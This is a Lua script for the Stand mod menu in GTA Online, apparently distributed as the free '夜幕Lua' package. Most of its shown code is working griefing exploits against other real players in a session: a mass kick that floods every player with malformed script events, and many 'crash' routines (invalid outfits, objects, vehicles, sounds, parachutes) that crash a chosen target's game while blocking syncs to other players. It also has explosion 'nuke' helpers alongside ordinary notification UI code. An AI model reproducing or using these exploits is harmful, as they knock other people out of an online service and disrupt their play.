-------------------------------------------------------欢迎使用夜幕Lua-----------------------------------------------------------------
-------------------------------------------------------夜幕Lua的制作仅供学习，不与任何其他Lua作者有矛盾--------------------------------
-------------------------------------------------------夜幕Lua的代码并非所有都是夜幕工作室制作--------------------
--分享使用请标明出处 否则无妈！！！
--未经允许私自改名者更无妈！！！
--要是想当个孤儿就当我没说！！！
--===========================================================================================================================(夜幕Lua纯免费，任何收费的都是无妈仔)
require "lib.YMlib.natives"

local colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 190,
purple = 49, 
blue = 11
}
function notification(message, color)
	HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
	local picture = "CHAR_SOCIAL_CLUB"
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
	title = "夜幕Lua"
	if color == colors.red or color == colors.red then
		subtitle = "~u~通知"
	elseif color == colors.black then
		subtitle = "~c~通知"
	else
		subtitle = "~u~通知"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 5, title, subtitle)
	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end

local menuAction = menu.action
local menuToggle = menu.toggle
local menuToggleLoop = menu.toggle_loop
local joaat = util.joaat
local wait = util.yield


local createPed = PED.CREATE_PED
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
local requestModel = STREAMING.REQUEST_MODEL
local hasModelLoaded = STREAMING.HAS_MODEL_LOADED
local noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED
local setPedCombatAttr = PED.SET_PED_COMBAT_ATTRIBUTES
local giveWeaponToPed = WEAPON.GIVE_WEAPON_TO_PED

WhiteText = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}

TXC_SLOW = false
function AIOKickAll()
    menu.trigger_commands("scripthost1")
    NETWORK.NETWORK_REQUEST_TO_BE_HOST_OF_THIS_SCRIPT()
    for i = 0, 31 do
        if i ~= players.user() and NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            util.toast("玩家已连接 " .. tostring(PLAYER.GET_PLAYER_NAME(i) .. ", 开始 AIO."))
            util.trigger_script_event(1 << i, {0x37437C28, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-1308840134, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x4E0350C6, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x114C63AC, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x15F5B1D4, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x249FE11B, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x76B11968, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x9C050EC, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x3B873479, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x23F74138, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            --[[
            util.trigger_script_event(1 << i, {0xAD63290E, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            ]]
            --[[
            util.trigger_script_event(1 << i, {0x39624029, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            ]]
            util.trigger_script_event(1 << i, {-0x529CD6F2, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x756DBC8A, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x69532BA0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x68C5399F, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x7DE8CAC0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x285DDF33, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x177132B8, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10)
            --util.toast("主程序块完成. // AIO")
            util.trigger_script_event(1 << i, {memory.script_global(1893548 + (1 + (i * 600) + 511)), i})
            for a = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << i, {-65587051, 28, a, n})
                    wait(10)
                end
            end
            --util.toast("第二块完成. // AIO")
            for a = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << i, {1445703181, 28, a, n})
                    wait(10)
                end
            end
            --util.toast("第三块完成. // AIO")
            if TXC_SLOW then
                wait(10)
                util.trigger_script_event(1 << i, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
                wait(10)
                util.trigger_script_event(1 << i, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
                wait(10)
                util.trigger_script_event(1 << i, {2002459655, -1000000, -10000, -100000000})
                wait(10)
                util.trigger_script_event(1 << i, {911179316, -38, -30, -75, -59, 85, 82})
                wait(10)
                --[[
                for n = -10, -7 do
                    for a = -60, 60 do
                        util.trigger_script_event(1 << i, {0x39624029, n, 623656, a, 73473741, -7, 856844, -51251, 856844})
                        wait(10)
                    end
                end
                ]]
                util.trigger_script_event(1 << i, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
                wait(10)
                util.trigger_script_event(1 << i, {-1386010354, 91645, -99683, 1788, 60877, 55085, 72028})
                wait(10)
                util.trigger_script_event(1 << i, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
                wait(10)
                for g = -28, 0 do
                    for n = -1, 1 do
                        for a = -1, 1 do
                            util.trigger_script_event(1 << i, {1445703181, i, n, a})
                        end
                    end
                    wait(10)
                end
                --[[for a = -28, 20 do
                    for n = -10, 2 do
                        for b = -100, 100 do
                            util.trigger_script_event(1 << i, {-1782442696, b, n, a})
                            util.log("第六块,加载 " .. b)
                        end
                        util.log("第七块,加载 " .. n)
                    end
                    util.log("第八块,加载 " .. a)
                    wait(10)
                end]]
                for a = -11, 11 do
                    util.trigger_script_event(1 << i, {2002459655, -1000000, a, -100000000})
                end
                for a = -10, 10 do
                    for n = 30, -30 do
                        util.trigger_script_event(1 << i, {911179316, a, n, -75, -59, 85, 82})
                    end
                end
                for a = -10, 10 do
                    util.trigger_script_event(1 << i, {-65587051, a, -1, -1})
                end
                util.trigger_script_event(1 << i, {951147709, i, 1000000, nil, nil}) 
                for a = -10, 10 do
                    util.trigger_script_event(1 << i, {-1949011582, a, 1518380048})
                end
                for a = -10, 4 do
                    for n = -10, 5 do
                        util.trigger_script_event(1 << i, {1445703181, 28, a, n})
                    end
                end
            end
            util.toast("第四块完成. // AIO")
            util.toast("循环 " .. i .. " 完成AIO踢出.")
            util.toast("玩家 " .. PLAYER.GET_PLAYER_NAME(i) .. " 已完成.")
        end
    end
    wait(100)
end

function PlagueCrashPlayer(pid)
    for i = 1, 10 do
        local cord = getEntityCoords(getPlayerPed(pid))
        requestModel(-930879665)
        wait(10)
        requestModel(3613262246)
        wait(10)
        requestModel(452618762)
        wait(10)
        while not hasModelLoaded(-930879665) do wait() end
        while not hasModelLoaded(3613262246) do wait() end
        while not hasModelLoaded(452618762) do wait() end
        local a1 = entities.create_object(-930879665, cord)
        wait(10)
        local a2 = entities.create_object(3613262246, cord)
        wait(10)
        local b1 = entities.create_object(452618762, cord)
        wait(10)
        local b2 = entities.create_object(3613262246, cord)
        wait(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        noNeedModel(452618762)
        wait(10)
        noNeedModel(3613262246)
        wait(10)
        noNeedModel(-930879665)
        wait(10)
        end
        if SE_Notifications then
            util.toast("已完成.")
        end
end

function BadOutfitCrash(pid)
    RqModel(0x705E61F2)
    local pc = getEntityCoords(getPlayerPed(pid))
    local ped = PED.CREATE_PED(26, 0x705E61F2, pc.x, pc.y, pc.z, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 45, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 1, 197, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 2, 76, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 3, 196, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 4, 144, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 5, 99, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 6, 102, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 7, 151, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 8, 189, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 9, 56, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 10, 132, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 11, 393, 0, 0)
    wait(2000)
    entities.delete_by_handle(ped)
end
function BadNetVehicleCrash(pid)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(2000)
    util.toast("已完成.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end

function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

local function SECrash(PlayerID)
    util.trigger_script_event(1 << PlayerID, { 962740265, PlayerID , 115831, 9999449 })
end

local function InvalidObjectCrash(PlayerID)
    BlockSyncs(PlayerID, function() 
	local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        util.yield(10)
    end
    util.yield(2000)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza3)
    entities.delete_by_handle(Object_pizza4)
    end)
end

local function InvalidClothesCrash(PlayerID)
    BlockSyncs(PlayerID, function() 
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
			ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
     end)
end

local function TrailerCrash(PlayerID)
         local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
         local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
         SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
         SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
         SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
         SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
         SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
         SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
         SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         	ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        for i = 0, 100 do 
            TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(SpawnedTowtruck)
        entities.delete_by_handle(SpawnedDune1)
        entities.delete_by_handle(SpawnedDune2)
        entities.delete_by_handle(SpawnedBarracks31)
        entities.delete_by_handle(SpawnedBarracks32)
        entities.delete_by_handle(SpawnedBarracks1)
        entities.delete_by_handle(SpawnedBarracks2)
end

local function SoundCrash(PlayerID)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 1000, false)
            end
        util.yield()
        end
     end)
end

local function OpenParachuteCrash(PlayerID)
    local user = players.user()
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z)
        util.yield(200)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(SelfPlayerPed)
        util.yield(500)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(SelfPlayerPed, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, 0, false, false, 0)
    end)
end

local function ChangeParachuteCrash(PlayerID)
    local user = players.user()
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
            PED.SET_PED_COMPONENT_VARIATION(SelfPlayerPed, 5, i, 0, 0)
            util.yield(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        util.yield(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(SelfPlayerPed, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, 0, false, false, 0)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    end)
end

local function DogCrash(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    
    BlockSyncs(PlayerID, function() 
        for i = 1, 10 do
            local ped1 = CreatePed(26, util.joaat('a_c_poodle'), ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(TargetPlayerPed, 0, 3, 0), 0) 
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(50)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(150)
        end
     end)
end

util.keep_running()

function xuancaipm(on)
    local a_toggle = menu.ref_by_path('World>Aesthetic Light>Aesthetic Light')
    if on then 
        menu.trigger_commands("shader glasses_purple")
        menu.trigger_commands("aestheticcolourred 255")
        menu.trigger_commands("aestheticcolourgreen 0")
        menu.trigger_commands("aestheticcolourblue 255")
        menu.trigger_commands("aestheticrange 10000")
        menu.trigger_commands("aestheticintensity 30")
        menu.trigger_commands("time 0")
        menu.set_value(a_toggle, true)
    else
        menu.set_value(a_toggle, false)
        menu.trigger_commands("shader off")
    end
end

function get_waypoint_v3()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)

        local success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
        local tries = 0
        while not success or tries <= 100 do
            success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
            tries += 1
            util.yield_once()
        end
        if success then
            waypoint_pos.z = Zcoord
        end

        return waypoint_pos
    else
        util.toast("没标点还玩个寄吧？")
    end
end

function executeNuke(pos)
    for a = 0, 100, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10.0, true, false, 1.0, false)
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z , 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
end
function Streament(hash) --Streaming Model
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    util.yield()
    end
end

local function executeNuke(pos)
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end
local function direction(offset)
    local c1 = get_offset_from_gameplay_camera(offset or 5)
    local res = raycast_gameplay_cam(1000)
    local c2

    if res.didHit then
        c2 = res.endCoords
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end
    c2:sub(c1)
    c2:mul(1000)

    return c2, c1
end

function juqishoulai()
    if PAD.IS_CONTROL_PRESSED(1, 323) then
                    while not STREAMING.HAS_ANIM_DICT_LOADED("random@mugging3") do
                        STREAMING.REQUEST_ANIM_DICT("random@mugging3")
                        util.yield(100)
                    end
                    if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                        WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), MISC.GET_HASH_KEY("WEAPON_UNARMED"), true)
                        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3, 3, -1, 51, 0, false, false, false)
                        STREAMING.REMOVE_ANIM_DICT("random@mugging3")
                        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
                    end
                end
                if PAD.IS_CONTROL_RELEASED(1, 323) and ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                    TASK.CLEAR_PED_SECONDARY_TASK(PLAYER.PLAYER_PED_ID())
                    PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
                end
    end

    b_notifications = {}
b_notifications.new = function ()
    local self = {}

    local active_notifs = {}
    self.notif_padding = 0.01
    self.notif_text_size = 0.7
    self.notif_title_size = 0.8
    self.notif_spacing = 0.3
    self.notif_width = 0.2
    self.notif_flash_duration = 3
    self.notif_anim_speed = 3
    self.notif_banner_colour = {r = 9, g = 0, b = 1, a = 9}
    self.notif_flash_colour = {r = 0.5, g = 0.0, b = 0.5, a = 1}
    self.max_notifs = 10
    self.notif_banner_height = 0.002
    self.use_toast = false
    local split = function (input, sep)
        local t={}
        for str in string.gmatch(input, "([^"..sep.."]+)") do
                table.insert(t, str)
        end
        return t
    end
    
    local function lerp(a, b, t)
        return a + (b - a) * t
    end
    local cut_string_to_length = function(input, length, fontSize)
        input = split(input, " ")
        local output = {}
        local line = ""
        for i, word in ipairs(input) do
            if directx.get_text_size(line..word, fontSize) >= length then
                if directx.get_text_size(word, fontSize) > length then
                    while directx.get_text_size(word , fontSize) > length do
                        local word_lenght = string.len(word)
                        for x = 1, word_lenght, 1 do
                            if directx.get_text_size(line..string.sub(word ,1, x), fontSize) > length then
                                output[#output+1] = line..string.sub(word, 1, x - 1)
                                line = ""
                                word = string.sub(word, x, word_lenght)
                                break
                            end
                        end
                    end
                else
                    output[#output+1] =  line
                    line = ""
                end
            end
            if i == #input then
                output[#output+1] = line..word
            end
            line = line..word.." "
        end
        return table.concat(output, "\n")
    end

    local draw_notifs = function ()
        local aspect_16_9 = 1.777777777777778
        util.create_tick_handler(function ()
            local total_height = 0
            local delta_time = MISC.GET_FRAME_TIME()
            for i = #active_notifs, 1, -1 do
                local notif = active_notifs[i]
                local notif_body_colour = notif.colour
                if notif.flashtimer > 0 then
                    notif_body_colour = self.notif_flash_colour
                    notif.flashtimer = notif.flashtimer - delta_time
                end
                if notif.current_y_pos == -10 then
                    notif.current_y_pos = total_height
                end
                notif.current_y_pos = lerp(notif.current_y_pos, total_height, 5 * delta_time * self.notif_anim_speed)
                if not notif.marked_for_deletetion then
                    notif.animation_state = lerp(notif.animation_state, 1, 10 * delta_time * self.notif_anim_speed)
                end
                --#region
                    directx.draw_rect(
                        1 - self.notif_width - self.notif_padding * 2,
                        0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
                        self.notif_width + (self.notif_padding * 2),
                        (notif.text_height + notif.title_height + self.notif_padding * 2 * aspect_16_9) * notif.animation_state,
                        notif_body_colour
                    )
                    directx.draw_rect(
                        1 - self.notif_width - self.notif_padding * 2,
